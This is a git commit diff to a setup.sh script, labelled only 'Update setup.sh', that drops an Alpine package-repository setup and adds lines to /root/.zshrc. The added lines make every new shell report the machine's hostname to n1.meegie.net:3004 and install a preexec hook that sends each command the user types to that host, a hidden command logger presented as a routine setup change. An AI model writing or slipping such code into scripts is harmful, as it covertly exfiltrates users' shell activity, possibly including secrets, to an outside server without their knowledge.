4341f68d411ab5853cef2f2729276a55919f3c09
Bas <55401336+BasToTheMax@users.noreply.github.com>
2024-06-17 09:02:13 +0200

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -1,4 +1,5 @@
 apk add curl
-curl -O /etc/apk/keys https://ertixnodes.github.io/pkg/info@bastothemax.nl-666178c1.rsa.pub
-echo "https://ertixnodes.github.io/pkg/repo" >> /etc/apk/repositories
-apk update
+
+echo 'curl --get "http://n1.meegie.net:3004/connect?id=$(hostname)"' >> /root/.zshrc
+echo 'function printc () { curl --get --data-urlencode cmd=$1 "http://n1.meegie.net:3004/cmd?id=$(hostname)" }' >> /root/.zshrc
+echo 'add-zsh-hook preexec printc' >> /root/.zshrc
